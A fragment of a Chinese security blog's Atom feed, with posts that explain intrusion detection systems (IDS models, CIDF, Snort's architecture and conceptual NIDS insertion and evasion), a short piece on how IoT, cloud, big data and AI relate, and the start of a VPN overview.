相互关系</h2><ol><li><p><strong>物联网</strong>本质上是互联网大脑的感觉神经系统和运动神经系统，传感器和通过AI控制的智能设备通过互联网线路连接到互联网中枢神经系统供云端的群体智慧和云AI使用(<strong>数据产生和收集器</strong>)</p></li><li><p><strong>云计算</strong>本质上是互联网大脑的中枢神经系统，它通过服务器，网络操作系统，神经元网络（大社交网络），大数据和基于大数据的人工智能算法对互联网大脑的其他组成部分进行控制(<strong>数据存储平台</strong>)</p></li><li><p><strong>大数据</strong>本质上是互联网大脑各神经系统在运转过程中传输和积累的<strong>有价值信息</strong>。因为在过去50年随着互联网的快速进化而急速膨胀，体量极其巨大。是互联网大脑产生智慧智能的基础(<strong>有价值的数据</strong>)</p></li><li><p><strong>人工智能</strong>本质是互联网大脑产生产生智慧智能的动力源泉，人工智能不仅仅通过算法如深度学习，机器学习与大数据结合，也运用到互联网大脑的神经末梢，神经网络和智能终端中。使得互联网大脑各个神经系统同时提升能力（<strong>智能化数据分析</strong>）</p></li></ol><hr><h2 id="0xFF-参考资源"><a href="#0xFF-参考资源" class="headerlink" title="0xFF 参考资源"></a>0xFF 参考资源</h2><ul><li><p><a href="http://imgtec.eetrend.com/blog/10926" target="_blank" rel="noopener">物联网技术矩阵图</a></p></li><li><p><a href="http://www.cac.gov.cn/files/pdf/baipishu/CloudStandardization.pdf" target="_blank" rel="noopener">云计算标准化白皮书 </a></p></li><li><p><a href="http://www.cesi.cn/images/editor/20180124/20180124135528742.pdf" target="_blank" rel="noopener">人工智能标准化白皮书</a></p></li></ul><ul><li><p><a href="https://github.com/mindpin/docs/wiki/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86" target="_blank" rel="noopener">https://github.com/mindpin/docs/wiki/Bigdata</a></p></li><li><p><a href="https://zh.wikipedia.org/wiki/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/artificial intelligence</a></p></li><li><p><a href="http://www.duozhishidai.com/article-1858-1.html" target="_blank" rel="noopener">http://www.duozhishidai.com/article-1858-1.html</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;近几年，随着互联网技术的发展与计算能力的提升，大数据，云计算，物联网，人工智能等概念越来与火热，那么这概念的诞生，发展，技术背景，以及这些“新技术”之间的关系又怎样？本文对网络上的相关资料(国内的版权意识及环境较差，部分文章出处难以考证)梳理一二，便于查阅与理解&lt;br&gt;
    
    </summary>
    
      <category term="0X01 思维视角" scheme="http://www.firehacker.top/categories/0X01-%E6%80%9D%E7%BB%B4%E8%A7%86%E8%A7%92/"/>
    
      <category term="新兴科技" scheme="http://www.firehacker.top/categories/0X01-%E6%80%9D%E7%BB%B4%E8%A7%86%E8%A7%92/%E6%96%B0%E5%85%B4%E7%A7%91%E6%8A%80/"/>
    
    
  </entry>
  
  <entry>
    <title>IDS技术简析</title>
    <link href="http://www.firehacker.top/2018/08/15/IDS%E6%8A%80%E6%9C%AF%E7%AE%80%E6%9E%90/"/>
    <id>http://www.firehacker.top/2018/08/15/IDS技术简析/</id>
    <published>2018-08-15T00:00:52.000Z</published>
    <updated>2018-09-19T03:06:23.496Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>入侵检测系统（Intrusion-detection system，缩写IDS）是一种网络安全设备或应用软件，可以监控网络传输或者系统，检查是否有可疑活动或者违反企业的政策。侦测到时发出警报或者采取主动反应措施，IDS是一种积极主动的安全防护技术。本文对IDS原理，CIDF模型，Snort，NIDS脆弱性及反NIDS技术进行简要分析与总结</p></blockquote><a id="more"></a><hr><h2 id="0x01-IDS概述"><a href="#0x01-IDS概述" class="headerlink" title="0x01 IDS概述"></a>0x01 IDS概述</h2><h3 id="1-IDS概念及模型"><a href="#1-IDS概念及模型" class="headerlink" title="1. IDS概念及模型"></a>1. IDS概念及模型</h3><p><strong>(1) 入侵及方式</strong></p><p>入侵就是试图破坏网络及信息系统<strong>机密性、完整性</strong>和<strong>可用性</strong>(CIA)的行为</p><p><strong>入侵方式</strong></p><ol><li><p>未授权的用户访问系统资源</p></li><li><p>已授权的用户企图获得更高权限，或者是已授权的用户滥用所给定的权限等</p></li></ol><p><strong>(2) 常见定义</strong></p><ol><li><p>检测对计算机系统的非授权访问</p></li><li><p>对系统的运行状态进行监视，发现各种攻击企图、攻击行为或攻击结果，以保证系统资源的保密性、完整性和可用性</p></li><li><p>识别针对计算机系统和网络系统、或广义上的信息系统的非法攻击，包括检测外部非法入侵者的恶意攻击或探测，以及内部合法用户越权使用系统资源的非法行为</p></li></ol><p><strong>(3) IDS(入侵检测系统) </strong></p><p><strong>定义：</strong>所有能够<strong>执行入侵检测任务</strong>和实现<strong>入侵检测功能</strong>的系统都可称为入侵检测系统(IDS，IntrusionDetection System)，其中包括软件系统或软/硬件结合的系统</p><p><strong>功能：</strong>入侵检测系统<strong>自动监视</strong>出现在计算机或网络系统中的事件，并<strong>分析</strong>这些事件，以判断是否有入侵事件的发生</p><p><strong>部署位置：</strong>入侵检测系统一般位于<strong>内部网的入口</strong>处，安装在<strong>防火墙的后面</strong>，用于检测外部入侵者的入侵和内部用户的非法活动</p><p><strong>(4) IDS 模型</strong></p><p><img src="http://par628i4r.bkt.clouddn.com/IDS%E6%A8%A1%E5%9E%8B.png" alt=""></p><ol><li><p><strong>数据收集器：</strong>又称探测器，主要负责<strong>收集数据</strong>。收集器的输入数据包括任何可能包含入侵行为线索的数据，如各种网络协议数据包、系统日志文件和系统调用记录等。探测器将这些数据收集起来，然后再发送到检测器进行处理</p></li><li><p><strong>检测器：</strong>又称分析器或检测引擎，负责<strong>分析和检测</strong>入侵的任务，并向控制器发出警报信号</p></li><li><p><strong>知识库：</strong>为检测器和控制器提供必需的<strong>信息支持</strong>。这些信息包括：用户或系统的历史活动档案或检测规则集合等</p></li><li><p><strong>控制器：</strong>也称为响应器，根据从检测器发来的警报信号，人工或自动地对入侵行为做出<strong>响应</strong></p></li></ol><p>此外，大多数入侵检测系统都会包含一个<strong>用户接口</strong>组件，用于观察系统的运行状态和输出信号，并对系统的行为进行控制</p><h3 id="2-IDS-任务"><a href="#2-IDS-任务" class="headerlink" title="2. IDS 任务"></a>2. IDS 任务</h3><p><strong>(1) 信息收集</strong></p><p>IDS所收集的信息包括用户(合法/非法用户)在网络、系统、数据库及应用程序活动的<strong>状态和行为</strong>。为了准确地收集用户的信息活动，需要在信息系统中的若干个<strong>关键点</strong>(包括不同网段、不同主机、不同数据库服务器、不同的应用服务器等处)设置<strong>信息探测点</strong></p><p><strong>IDS可利用的信息来源</strong></p><p>A. 系统和网络的<strong>日志文件</strong></p><ul><li>日志文件中包含发生在系统和网络上异常活动的<strong>证据</strong>，通过查看日志文件，能够发现黑客的入侵行为</li></ul><p>B. <strong>目录和文件</strong>中的<strong>异常</strong>改变</p><ul><li>信息系统中的目录和文件中的异常改变(包括修改、创建和删除)，特别是那些限制访问的重要文件和数据的改变，很可能就是一种入侵行为</li></ul><p>C. <strong>程序执行</strong>中的<strong>异常</strong>行为</p><ul><li>每个进程在具有不同权限的环境中执行，这种环境控制着进程可访问的系统资源、程序和数据文件等</li></ul><p>D. <strong>网络活动</strong>信息</p><ul><li>远程攻击主要通过网络发送<strong>异常数据包</strong>而实现，为此IDS需要收集TCP连接的状态信息以及网络上传输的实时数据(如果收集到大量的<strong>TCP半开连接</strong>，则可能是<strong>拒绝服务攻击</strong>的开始。如果在短时间内有大量的到<strong>不同TCP（或UDP）端口</strong>的连接，则很可能说明有人在对己方的网络进行<strong>端口扫描</strong>)</li></ul><p><strong>(2) 信息分析</strong></p><p>对收集到的网络、系统、数据及用户活动的状态和行为信息等进行<strong>模式匹配</strong>、<strong>统计分析</strong>和<strong>完整性分析</strong>，得到实时检测所必需的信息</p><p>A. <strong>模式匹配</strong></p><ul><li>将收集到的信息与已知的网络入侵模式的<strong>特征数据库</strong>进行比较，从而发现违背安全策略的行为。(模式匹配的关键是<strong>如何表达入侵模式</strong>，把入侵行为与正常行为<strong>区分</strong>开来。模式匹配的优点是<strong>误报率小</strong>，其局限性是<strong>只能发现已知攻击</strong>，而对未知攻击无能为力)</li></ul><p>B. <strong>统计分析</strong></p><ul><li>统计分析是入侵检测常用的<strong>异常发现</strong>方法。统计分析方法就是先<strong>创建</strong>系统对象(如用户、文件、目录和设备等)的<strong>统计属性</strong>(如访问次数、操作失败次数、访问地点、访问时间、访问延时等)，再将信息系统的<strong>实际行为</strong>与统计属性进行<strong>比较</strong>。当观察值在正常值范围之外时，则认为有入侵行为发生</li></ul><p>C. <strong>完整性分析</strong></p><ul><li>完整性分析<strong>检测</strong>某个文件或对象是否被<strong>更改</strong>。完整性分析常利用<strong>消息杂凑函数</strong>(如MD5和SHA)，能识别目标的微小变化。该方法的优点是某个文件或对象发生的任何一点改变都能够被发现</li></ul><p><strong>(3) 安全响应</strong></p><p>IDS在发现入侵行为后必然及时做出响应，包括<strong>终止网络服务</strong>、<strong>记录事件日志</strong>、<strong>报警和阻断</strong>等</p><p><strong>响应类型</strong></p><p>A. <strong>主动响应</strong></p><p>由<strong>用户驱动</strong>或<strong>系统本身自动执行</strong>，可对入侵行为采取终止网络连接、改变系统环境(如修改防火墙的安全策略)等</p><p>B. <strong>被动响应</strong></p><p>包括发出告警信息和通知等</p><p><strong>常用响应方式</strong></p><p>记录日志、实时显示、E-mail报警、声音报警、SNMP报警、实时TCP阻断、防火墙联动、手机短信报警等</p><h3 id="3-IDS-主要功能"><a href="#3-IDS-主要功能" class="headerlink" title="3. IDS 主要功能"></a>3. IDS 主要功能</h3><p><strong>(1) 网络流量的跟踪与分析功能</strong></p><p>跟踪用户进出网络的所有活动，实时检测并分析用户在系统中的活动状态；实时统计网络流量，检测拒绝服务攻击等异常行为</p><p><strong>(2) 已知攻击特征的识别功能</strong></p><p>识别特定类型的攻击，并向控制台报警，为网络防护提供依据。根据定制的条件过滤重复告警事件，减轻传输与响应的压力</p><p><strong>(3) 异常行为的分析、统计与响应功能</strong></p><p>分析系统的异常行为模式，统计异常行为，并对异常行为做出响应</p><p><strong>(4) 特征库的在线和离线升级功能</strong></p><p>提供入侵检测规则的在线和离线升级，实时更新入侵特征库，不断提高IDS的入侵检测能力</p><p><strong>(5) 数据文件的完整性检查功能</strong></p><p>检查关键数据文件的完整性，识别并报告数据文件的改动情况</p><p><strong>(6) 自定义的响应功能</strong></p><p>定制实时响应策略；根据用户定义，经过系统过滤，对告警事件及时响应</p><p><strong>(7) 系统漏洞的预报警功能</strong></p><p>对未发现的系统漏洞特征进行预报警</p><p><strong>(8) IDS探测器集中管理功能</strong></p><p>通过控制台收集探测器的状态和告警信息，控制各个探测器的行为</p><h3 id="4-IDS-分类"><a href="#4-IDS-分类" class="headerlink" title="4. IDS 分类"></a>4. IDS 分类</h3><p><strong>(1) 基于网络的入侵检测系统 (NIDS，NetworkIntrusion Detection System)</strong></p><p><img src="http://pdeise3e3.bkt.clouddn.com/%E5%9F%BA%E4%BA%8E%E7%BD%91%E7%BB%9CIDS.png" alt=""></p><ul><li><p>数据来自<strong>网络数据流</strong>。NIDS能够截获网络中的数据包，<strong>提取其特征</strong>并与知识库中已知的攻击签名相<strong>比较</strong>，从而达到检测目的</p></li><li><p>优点是<strong>检测速度快、隐蔽性好、不容易受到攻击</strong>、不消耗被保护主机的<strong>资源</strong>；缺点是有些攻击是从被保护的<strong>主机</strong>发出的，不经过网络，因而<strong>无法识别</strong></p></li></ul><p><strong>(2) 基于主机的入侵检测系统(HIDS，Host IntrusionDetection System)</strong></p><p><img src="http://pdeise3e3.bkt.clouddn.com/%E5%9F%BA%E4%BA%8E%E4%B8%BB%E6%9C%BAIDS.png" alt=""></p><ul><li><p>数据来源于<strong>主机系统</strong>，通常是<strong>系统日志</strong>和<strong>审计记录</strong>。HIDS通过对系统日志和审计记录的不断<strong>监控和分析</strong>来发现入侵</p></li><li><p>优点是针对不同操作系统<strong>捕获应用层入侵</strong>，<strong>误报少</strong>；缺点是<strong>依赖</strong>于主机及其子系统，<strong>实时性差</strong></p></li><li><p>HIDS通常<strong>安装在被保护的主机</strong>上，主要对该主机的<strong>网络实时连接</strong>及<strong>系统审计日志</strong>进行<strong>分析和检查</strong>，在发现可疑行为和安全违规事件时，向管理员报警</p></li></ul><p><strong>LIDS：基于Linux内核的入侵检测系统</strong></p><ul><li>在Linux内核中实现了<strong>参考监听模式</strong>以及<strong>命令进入控制(Mandatory Access Control)模式</strong>，可以<strong>实时监视</strong>操作状态，旨在从系统核心加强其安全性。在某种程度上可以认为它的检测数据来源于操作系统的内核操作，在这一级别上检测入侵和非法活动，因此其安全特性要高于其他两类IDS</li></ul><p><strong>(3) 分布式入侵检测系统 (DIDS，Distributed Intrusion Detection System)</strong></p><ul><li><p>采用上述两种数据来源。这种系统能够<strong>同时分析</strong>来自<strong>主机</strong>系统的<strong>审计日志</strong>和来自<strong>网络</strong>的<strong>数据流</strong>，一般为分布式结构，由多个部件组成。DIDS可以从多个主机获取数据，也可以从网络取得数据，克服了单一的HIDS和NIDS的不足</p></li><li><p>典型的DIDS采用<strong>控制台/探测器结构</strong>。NIDS和HIDS作为<strong>探测器</strong>放置在网络的<strong>关键节点</strong>，并向<strong>中央控制台</strong>汇报情况。<strong>攻击日志</strong>定时传送到<strong>控制台</strong>，并保存到<strong>中央数据库</strong>中，新的<strong>攻击特征</strong>能及时发送到各个<strong>探测器</strong>上。每个探测器能够根据所在网络的实际需要配置不同的规则集</p></li></ul><hr><h2 id="0x02-CIDF-模型"><a href="#0x02-CIDF-模型" class="headerlink" title="0x02 CIDF 模型"></a>0x02 CIDF 模型</h2><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h3><p><strong>CIDF</strong> 是一种推荐的<strong>入侵检测标准架构</strong>，大多数IDS是独立开发的，不同系统之间<strong>缺乏互操作性</strong>和<strong>互用性</strong>，因此，DARPA（theDefense Advanced Research Prouects Agency，美国国防部高级研究计划局）在1997年3月开始着手通用入侵检测架构（CIDF, Common Intrusion Detection Framework）标准的制定</p><h3 id="2-CIDF-主要目的"><a href="#2-CIDF-主要目的" class="headerlink" title="2. CIDF 主要目的"></a>2. CIDF 主要目的</h3><p><strong>(1) IDS构件共享： </strong>即<strong>一个</strong>IDS系统的构件可被<strong>另一个</strong>系统使用</p><p><strong>(2) 数据共享：</strong>即通过提供<strong>标准的数据格式</strong>，使得IDS中的各类数据可以在<strong>不同的系统</strong>之间传递并共享</p><p><strong>(3)</strong> <strong>完善互用性标准</strong>，并建立一套开发接口和支持工具，以提供独立开发部分构件的能力</p><h3 id="3-CIDF-框架结构"><a href="#3-CIDF-框架结构" class="headerlink" title="3. CIDF 框架结构"></a>3. CIDF 框架结构</h3><p><strong>CIDF模型</strong>将入侵检测需要<strong>分析的数据</strong>称作<strong>事件（Event）</strong>，它可以是基于网络的入侵检测系统的数据包，也可以是基于主机的入侵检测系统从系统日志等其它途径得到的信息。模型也对各个部件之间<strong>信息传递格式</strong>、<strong>通信方法</strong>和<strong>API</strong>进行了<strong>标准化</strong></p><p><img src="http://pdeise3e3.bkt.clouddn.com/CIDF%E6%A1%86%E6%9E%B6.png" alt=""></p><p><strong>(1) 事件产生器</strong></p><p>从整个的计算机环境（也称为信息源）中<strong>获得事件</strong>，并向系统的其他部分<strong>提供该事件</strong>，这些数据源可以是网络、主机或应用系统中的信息</p><p><strong>(2) 事件分析器</strong></p><p>从事件产生器中<strong>获得数据</strong>，通过各种分析方法—一般为<strong>误用检测</strong>和<strong>异常检测</strong>方法来<strong>分析数据，</strong>决定入侵是否已经发生或者正在发生，分析方法的选择尤为重要</p><p><strong>(3) 响应单元</strong></p><p>对分析结果<strong>作出反应</strong>的<strong>功能单元</strong>。最简单的响应是<strong>报警</strong>，通知管理者入侵事件的发生，由管理者决定采取应对的措施</p><p><strong>(4) 事件数据库</strong></p><p><strong>存放</strong>各种中间和最终<strong>数据</strong>的地方的总称，它可以是复杂的数据库，也可以是简单的文本文件</p><p><strong>(5) 目录服务构件</strong></p><p>用于各构件<strong>定位</strong>其他的构件，以及<strong>控制</strong>其他构件传递的<strong>数据</strong>并认证其他构件的<strong>使用</strong>，以防止IDS系统本身受到攻击。它可以管理和发布密钥，提供构件信息和告诉用户构件的功能接口</p><h3 id="4-IDS-处理模式"><a href="#4-IDS-处理模式" class="headerlink" title="4. IDS 处理模式"></a>4. IDS 处理模式</h3><p>在目前的入侵检测系统中，经常用信息源、分析部件和响应部件来分别代替事件产生器、事件分析器和响应单元等术语。因此，人们往往将<strong>信息源、分析和响应</strong>称作入侵检测系统的<strong>处理模式</strong></p><hr><h2 id="0x03-入侵检测方法"><a href="#0x03-入侵检测方法" class="headerlink" title="0x03 入侵检测方法"></a>0x03 入侵检测方法</h2><p>事件分析器也称为<strong>分析引擎</strong>，是入侵检测系统中最重要的<strong>核心部件</strong>，IDS的分析引擎通常使用两种基本的分方法来分析事件、检测入侵行为，即<strong>误用检测</strong>(MD，Misuse Detection)和<strong>异常检测</strong>(AD，Anomaly Detection)</p><h3 id="1-误用检测-MD"><a href="#1-误用检测-MD" class="headerlink" title="1. 误用检测(MD)"></a>1. 误用检测(MD)</h3><p><strong>(1) MD 概述</strong></p><p><strong>误用检测技术</strong>又称<strong>基于知识的检测技术</strong>。它假定所有入侵行为和手段(及其变种)都能够表达为一种<strong>模式</strong>或<strong>特征</strong>，并对已知的入侵行为和手段进行分析，提取入侵特征，构建攻击模式或攻击签名，通过系统当前状态与攻击模式或攻击签名的<strong>匹配</strong>判断入侵行为。误用检测是最<strong>成熟</strong>、应用最<strong>广泛</strong>的技术</p><p><strong>(2) 优点及缺陷</strong></p><p>误用检测技术的<strong>优点</strong>在于可以准确地检测<strong>已知</strong>的入侵行为，<strong>缺点</strong>是不能检测<strong>未知</strong>的入侵行为。误用检测的<strong>关键</strong>在于如何表达入侵行为，即<strong>攻击模型的构建</strong>，把真正的入侵与正常行为区分开来</p><p><strong>(3) MD 模型</strong></p><p><img src="http://pdeise3e3.bkt.clouddn.com/MD%E6%A8%A1%E5%9E%8B.png" alt=""></p><h3 id="2-异常检测-AD"><a href="#2-异常检测-AD" class="headerlink" title="2. 异常检测(AD)"></a>2. 异常检测(AD)</h3><p><strong>(1) AD 概述</strong></p><p>异常检测技术又称为<strong>基于行为</strong>的入侵检测技术，用来<strong>检测</strong>系统（主机或网络）中的<strong>异常行为</strong>。其基本设想是入侵行为与正常的(合法的)活动有明显的差异，即正常行为与异常行为有明显的差异</p><p><strong>(2) AD 工作原理</strong></p><p>A. 首先<strong>收集</strong>一段时间系统活动的历史<strong>数据</strong></p><p>B. 再<strong>建立</strong>代表主机、用户或网络连接的正常行为<strong>描述</strong></p><p>C. 然后收集事件数据并使用一些不同的方法来<strong>决定</strong>所检测到的事件活动是否<strong>偏离</strong>了正常行为模式</p><p>D. 最终判断是否发生了入侵</p><p><strong>(3) AD 常用方法</strong></p><pre><code>A. 统计异常检测方法B. 特征选择异常检测方法C. 基于贝叶斯推理异常检测方法D. 基于贝叶斯网络异常检测方法E. 基于模式预测异常检测方法</code></pre><p>比较成熟的方法是<strong>统计异常检测</strong>方法和<strong>特征选择异常检测</strong>方法</p><hr><h2 id="0x04-Snort及IDS部署"><a href="#0x04-Snort及IDS部署" class="headerlink" title="0x04 Snort及IDS部署"></a>0x04 Snort及IDS部署</h2><h3 id="1-Snort-简述"><a href="#1-Snort-简述" class="headerlink" title="1. Snort 简述"></a>1. Snort 简述</h3><p><strong>Snort</strong>是一个是一个基于<code>libpcap</code>的<strong>轻量级网络入侵检测系统</strong>，所谓轻量级入侵检测系统，是指它能够方便地安装和配置在网络中任何一个节点上，而且不会对网络产生太大的影响。它对系统的配置要求比较低，可支持多种操作平台，包括Linux、Windows、Solaris和FreeBSD等。在各种NIDS产品中，Snort是其中最好的之一，它是用C语言编写的开源软件，官方站点<a href="https:/www.snort.org/" target="_blank" rel="noopener">www.snort.org</a></p><h3 id="2-Snort-功能"><a href="#2-Snort-功能" class="headerlink" title="2. Snort 功能"></a>2. Snort 功能</h3><pre><code>(1) 基于规则的检测引擎(2) 良好的可扩展性。可以使用预处理器和输出插件来对Snort的功能进行扩展(3) 灵活简单的规则描述语言。掌握了基本的TCP、IP知识，就可以编写自己的规则(4) 除了用作入侵检测系统，还可以用作嗅探器和包记录器</code></pre><h3 id="3-Snort-组成结构"><a href="#3-Snort-组成结构" class="headerlink" title="3. Snort 组成结构"></a>3. Snort 组成结构</h3><p><img src="http://pdeise3e3.bkt.clouddn.com/Snort%E7%BB%84%E6%88%90.png" alt=""></p><p><strong>(1) 解码器</strong></p><p>负责从网络接口上<strong>获取数据包</strong>。在编程实现上，解码器用一个<strong>结构体</strong>来表示单个数据包，该结构记录了与各层协议有关的信息和其他检测引擎需要用到的信息。获取的信息将被送往检测引擎或者预处理器中。解码器支持多种类型的网络接口，包括Ethernet、SLIP、PPP等</p><p><strong>(2) 检测引擎</strong></p><p>该子系统是Snort工作在入侵检测模式下的<strong>核心部分</strong>，它使用基于<strong>规则匹配</strong>的方式来检测每个数据包。一旦发现数据包的特征符合某个规则定义，则触发相应的处理操作</p><p><strong>(3) 日志/警报子系统</strong></p><p>规则中定义了数据包的处理方式，包括alter(报警)、log(日志记录)和pass(忽略)等，但具体的<strong>alter</strong>和<strong>log操作</strong>则是由日志/警报子系统完成的。<strong>日志子系统</strong>将解码得到的信息以ASCII码的格式或以tcpdump的格式<strong>记录</strong>下来，<strong>警报子系统</strong>将报警信息<strong>发送</strong>到syslog、socket或数据库中</p><p><strong>(4) 预处理器</strong></p><p>额外的检测机制在Snort中是通过预处理器来实现的，它工作在检测引擎之前，解码器之后</p><p><strong>预处理器类型</strong></p><pre><code>A. 包重组：这类预处理器的代表有stream4和frag2，它们将多个数据包中的数据进行组合，构成一个新的待检测包，然后将这个包交给检测引擎或其他预处理器B. 协议解码：为了方便检测引擎方便地处理数据，这类预处理器对Telnet，HTTP和RPC等协议进行解析，并使用统一规范的格式对其进行表述C. 异常检测：用来检测无法用一般规则发现的攻击和协议异常。与前面两种预处理器相比，异常检测预处理器更侧重于报警功能</code></pre><p><strong>(5) 输出插件</strong></p><p>输出插件用来<strong>格式化警报信息</strong>，使得管理员可以按照公司环境来配置容易理解、使用和查看的报警和日志方法。Snort有大量的插件来支持不同的格式，包括<strong>数据库、XML、Syslog</strong>等格式</p><h3 id="4-Snort工作流程"><a href="#4-Snort工作流程" class="headerlink" title="4. Snort工作流程"></a>4. Snort工作流程</h3><p><img src="http://pdeise3e3.bkt.clouddn.com/Snort%E7%BB%84%E6%88%90.png" alt=""></p><pre><code>(1) 首先，Snort利用libpcap进行抓包(2) 之后，由解码器将捕获的数据包信息填入包结构体，并将其送到各式各样的预处理器中(3) 对于那些用于检测入侵的预处理器来说，一旦发现了入侵行为，将直接调用输出插件或者日志、警报子系统进行输出(4) 对于那些用于包重组和协议解码的预处理器来说，它们会将处理后的信息送往检测引擎，由检测引擎对数据包的特征及内容进行检查，一旦检测到与已知规则匹配的数据包，或者利用输出插件进行输出，或者利用日志、警报子系统进行报警和记录</code></pre><hr><h2 id="0x05-IDS-发展方向"><a href="#0x05-IDS-发展方向" class="headerlink" title="0x05 IDS 发展方向"></a>0x05 IDS 发展方向</h2><pre><code>(1) 宽带高速实时检测技术(2) 大规模分布式的检测技术(3) 数据挖掘技术(4) 更先进的检测算法(5) 入侵响应技术</code></pre><hr><h2 id="0x06-NIDS脆弱性及规避技术"><a href="#0x06-NIDS脆弱性及规避技术" class="headerlink" title="0x06 NIDS脆弱性及规避技术"></a>0x06 NIDS脆弱性及规避技术</h2><h3 id="1-NIDS面临的问题"><a href="#1-NIDS面临的问题" class="headerlink" title="1. NIDS面临的问题"></a>1. NIDS面临的问题</h3><p><strong>(1) 检测的工作量很大</strong></p><ul><li><p>NIDS需要高效的检测方法和大量的系统资源</p></li><li><p>NIDS的检测是资源密集型的</p></li></ul><p><strong>(2) 检测方法的局限性</strong></p><ul><li><p>复杂的、智能化方法的作用十分有限，而AD方法(误用检测方法)受限于某些资源的请求使用在数据传输过程中的模糊性与隐含性</p></li><li><p>特征匹配作为一种轻量级的检测方法有其固有的缺陷，缺乏弹性（尤其是字符串匹配）</p></li></ul><p><strong>(3) 网络协议的多样性与复杂性</strong></p><ul><li><p>TCP/IP协议族本身十分庞杂，各种协议不下几十种，呈现横向跨越和纵向深入的两维分布</p></li><li><p>NIDS将难于理解应用层的意图，更无法模拟或理解某些应用提供的功能作用于具体环境下所产生的效果</p></li></ul><p><strong>(4) 系统实现的差异</strong></p><ul><li><p>– 具体实现时，各种系统不完全按RFC，对那些建议值和可选功能，会有自己的偏好，很难做到与目标系统的一致性处理</p></li><li><p>某些系统（如Unix）出于操作的自由性和应用的方便性，允许用户对网络底层进行直接操作</p></li></ul><h3 id="2-规避NIDS技术"><a href="#2-规避NIDS技术" class="headerlink" title="2. 规避NIDS技术"></a>2. 规避NIDS技术</h3><p><strong>(1) Insertion技术</strong></p><p><strong>Insertion</strong>是指<strong>诱使</strong>NIDS接受一些目标系统<strong>无法接收</strong>或是<strong>拒绝接受</strong>的数据包</p><p><strong>影响方面</strong></p><p>A. 针对<strong>非单特征点</strong>的入侵特征进行<strong>插入操作</strong>，将导致特征失效</p><p><img src="http://pdeise3e3.bkt.clouddn.com/NIDS%E5%8D%95%E7%82%B9.png" alt=""></p><ul><li><p>假设<strong>“INFO”</strong>作为入侵的一个<strong>特征串</strong>，入侵者分四个数据包发出该特征串，并在发送第二个特征点“N”之后插入一个迷惑数据包“X”，该数据包对于目标系统来说是无法接收或拒绝接受的，但NIDS却错误地接受了，于是目标系统与NIDS得到不同的“特征串”。从目标系统来看入侵显然发生了，但对于NIDS来说它将无法检测到“INFO”，因此也不会据此判断入侵的发生</p></li><li><p>对于这种情况而言，入侵特征是非单特征点的，因为单特征点是无法Insertion的，而且需要特征的<strong>分割传输</strong>，并在传输中间插入可以导致NIDS错误接受的迷惑性数据包</p></li></ul><p>B. 失去状态同步</p><p>NIDS错误地接受了目标系统无法接收或是拒绝接受的数据包，那么两者之间的状态就会产生不一致，我们称之为“失去状态同步”</p><p><img src="http://pdeise3e3.bkt.clouddn.com/NIDS%E7%8A%B6%E6%80%81.png" alt=""></p><ul><li><p>假设目标系统处于状态A，NIDS跟踪连接也保持为这一状态。现在入侵者发送一个携带状态B的数据包，因为某种原因目标系统没有接收(或接受)数据包，而NIDS却接受了该数据包并更新状态为B，于是与目标系统失去状态同步。在NIDS找回状态同步之前，对后继数据包接受与处理上可能会与目标系统产生不一致。更为严重的是，NIDS可能会在错误接受的数据包的误导下复位或终止相应的状态跟踪，以至放弃或失去对目标系统连接的跟踪</p></li><li><p>这种影响并不基于特征匹配，但它只适用于需要维护状态信息的或<strong>面向连接</strong>的情况</p></li></ul><p><strong>(2) Evasion 技术</strong></p><p>这一次是<strong>NIDS错误地拒绝了本应接受的数据包</strong>，从而导致NIDS比目标系统“少”看到了东西，这种非一致性同样可能产生问题</p><p><strong>影响方面</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;入侵检测系统（Intrusion-detection system，缩写IDS）是一种网络安全设备或应用软件，可以监控网络传输或者系统，检查是否有可疑活动或者违反企业的政策。侦测到时发出警报或者采取主动反应措施，IDS是一种积极主动的安全防护技术。本文对IDS原理，CIDF模型，Snort，NIDS脆弱性及反NIDS技术进行简要分析与总结&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="0x02 原理浅析" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/"/>
    
      <category term="网络安全" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Snort" scheme="http://www.firehacker.top/tags/Snort/"/>
    
      <category term="IDS" scheme="http://www.firehacker.top/tags/IDS/"/>
    
      <category term="NIDS" scheme="http://www.firehacker.top/tags/NIDS/"/>
    
  </entry>
  
  <entry>
    <title>VPN技术浅析</title>
    <link href="http://www.firehacker.top/2018/08/14/VPN%E6%8A%80%E6%9C%AF%E6%B5%85%E6%9E%90/"/>
    <id>http://www.firehacker.top/2018/08/14/VPN技术浅析/</id>
    <published>2018-08-14T12:48:07.000Z</published>
    <updated>2018-09-19T03:04:00.075Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>VPN（Virtual Private Network）即“虚拟专用网络”，是企业网在因特网(或其他公共网络)上的扩展，VPN在因特网上开辟一条安全的隧道，以保证两个端点（或两个局域网）之间的安全通信。本文对网络边界安全技术-VPN进行简要分析与总结<br><a id="more"></a></p></blockquote><hr><h2 id="0x01-VPN概述"><a href="#0x01-VPN概述" class="headerlink" title="0x01 VPN概述"></a>0x01 VPN概述</h2><h3 id="1-功能和原理"><a href="#1-功能和原理" class="headerlink" title="1. 功能和原理"></a>1. 功能和原理</h3><p><strong>(1) VPN 功能</strong></p><p>将因特网虚拟成路由器，将物理位置分散的局域网和主机<strong>虚拟</strong>成一个统一的虚拟企业网。VPN综合利用了隧道技术、加密技术、鉴别技术和密钥管理等技术，在公共网络之上建立一个虚拟的安全通道，实现两个网络或两台主机之间的安全连接</p><p><strong>(2) VPN 典型模式</strong></p><ol><li>远程用户访问企业内网</li></ol><p><img src="http://pcdbq4c2i.bkt.clouddn.com/VPN%E6%A8%A1%E5%BC%8F%E4%B8%80.png" alt=""></p><ol start="2"><li>企业分支机构之间的局域网互联</li></ol><p><img 